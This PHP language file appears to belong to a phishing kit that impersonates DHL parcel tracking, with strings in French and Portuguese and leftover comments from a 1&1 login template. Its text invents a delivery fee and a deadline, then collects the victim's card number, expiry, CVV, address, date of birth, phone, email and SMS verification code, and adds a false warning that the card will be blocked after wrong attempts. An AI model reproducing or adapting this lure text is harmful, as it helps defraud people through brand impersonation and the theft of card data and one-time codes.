<?php
/*==========================================================================
* +-+-+-+-+-+-+-+-+-+-+ Author Name      : ZÉROFAUTES
* |Z|É|R|O|F|A|U|T|E|S| Template Name    : 1&1
* +-+-+-+-+-+-+-+-+-+-+ Template Version : V.0.1
===========================================================================*/
function lang($phrase){
	static $lang = array(
		/* Main Page */
		'Title'  => '| Bienvenue |', 										/* Title */
		'Fo9001'  => 'Clients privés', 								/* Loading Header */
		'Fo9002' => "Clients de l'entreprise", 								/* Loading P 1 */
		'LdngP2' => 'Envoyer des colis,', 									/* Loading P 2 */
		'LdngP3' => 'Recevoir des colis', 									/* Loading P 3 */
		'LdngP4' => 'Aide et contact',  									/* Loading P 4 */
		'LdngP5'	 => 'Suivi DHL.',	  							/* DHL TRACKING */
		'CntP'	 => 'Vous trouverez ici des informations sur vos envois.',	  								/* Control Panel */
		'CusId'	 => "Suivez les envois de colis à tout moment, de l'expédition à la livraison",
		'InpL1'	 => 'Expédition DHL',										/* Label Input 1 */
		'CusPs'	 => 'numéro de suivi 0034043413918594392 - ',		  									/* Customer Password */
		'InpL2'	 => 'Statut: ',							/* Label Input 2 */
		'Rmmbr'	 => 'dans la livraison',										/* Remember Me */
		'Lbtn'	 => 'Message important!',											/* Login Btn */
		'Span1'	 => 'Pour terminer la livraison dès que possible, confirmez le paiement',				/* Are you still ... */
		'Span2'	 => 'en cliquant sur Suivant. La confirmation en ligne doit être effectuée dans les 14 jours suivants, avant son expiration.',
		'Ntke'	 => 'Próximo',									/* Btn next */
		'AsdH2'	 => 'DHL Pacote',											/* Service */
		'AsdS1'	 => 'DHL Serviços',										/* MailXchange */
		'AsdS2'	 => 'DHL Express',						/* Detailed help and contact */
		'AsdS3'	 => 'DHL Logística',										/* Online FAQs */
		'AsdS4'	 => 'Contato',										/* GoToAssist */
		'P1H1'	 => 'Ajuda e serviço ao cliente',								/* 1&1 MyWebsite*/
		'P1Pr'	 => 'Veja como funciona',											/* Here's how it works */
		'P2H1'	 => 'Aplicativos móveis',								/* Microsoft Office 365 */
		'P2Pr'	 => 'Sobre nós',					/* Paragraphe 2 Paragraphe */
		'P3H1'	 => 'Post DHL',									/* 1&1 Domains */
		'P3Pr'	 => 'Responsabilidade',											/* Paragraphe 3 Paragraphe */
		'PLink'	 => 'Presse',									/* More information */
		'FtrS1'	 => 'Carreira',							/* 1&1 Internet Ltd. • 2018 */
		'FtrS2'	 => ' DHL International GmbH - All rights reserved.',									/* Privacy Policy */
		'Sfokh'	 => 'Precisamos do seu endereço para garantir que pessoas não autorizadas não possam acessar seus pacotes, Você tem ',									/* We need your address to be sure */
		'Ayam'	 => '10 dias úteis',									/* 10 working days */
		'Froth'	 => 'Desde a chegada do seu pacote até a filial da DHL, depois desse tempo, o pacote será devolvido ao remetente.',									/* From the arrival of your package */
		'InptCC'	 => 'Nome do titular do cartão',									/* Cardholder's name */
		'InptCCN'	 => 'Número do Cartão de Crédito',									/* Credit card number */
		'ExpMmAa'	 => 'Exp MM/AA',									/* Expir */
		'NumCvC'	 => 'CVV (CVC)',									/* CVV */
		'AddInf'	 => 'Distrito',									/* Address */
		'CodPOs'	 => 'Código-Postal',									/* Zip */
		'MdiNa'	 => 'Cidade',									/* Zip */
		'Zdiyad'	 => 'Data de nascimento DD/MM/AAAA',									/* DOB */
		'Farnon'	 => 'Número de telefone',									/* Phone Number */
		'Barid'	 => 'Your E-mail',									/* Your Email */
		'PlzCon'	 => 'Por favor, confirme o seguinte pagamento.',									/* Please confirm the following */
		'Theun'	 => 'A senha exclusiva foi enviada para o número de celular listado abaixo. Se você precisar alterar seu número de celular, entre em contato com seu banco ou modifique-o através dos canais disponíveis (caixa eletrônico, web).',									/* Please confirm the following */
		'March'	 => 'Comerciante:',									/* Merchant */
		'ExpDh'	 => 'DHL EXPRESS',									/* DHL EXPRESS */
		'Ch7al'	 => 'Montante:',									/* Amount */
		'Tarikh'	 => 'Data:',									/* Date */
		'TlNum'	 => 'Seu número de telefone:',									/* Your Phone Number */
		'SmCos'	 => 'código SMS:',									/* Your SMS */
		'PlzSm'	 => 'Digite o código de verificação recebido por sms: ',				/* Please enter the */
		'Subnn'	 => 'Enviar',				/* Submit */
		'AllCp'	 => 'DHL International GmbH - All rights reserved.',				/* All Right */
		'SmEnv'	 => 'Código SMS enviado ...',				/* SMS code sent... */
		'SmWron'	 => 'O SMS está errado ou expirou! Após (3) erros na inserção do código recebido via SMS, a transação atual é cancelada e o cartão de crédito bloqueado.',				/* SMS is wrong */
		'LastSm'	 => 'Atenção! Digite o último SMS recebido',				/* SMS is wrong */
		'YouHav'	 => 'Você ativou o processo de entrega com sucesso. Você receberá um e-mail quando enviarmos o seu pacote.'				/* SMS is wrong */
		
		
		
		
	);	
	return $lang[$phrase];
}




//		 | ' | = &apos;




 ?>
 
 
 
 
 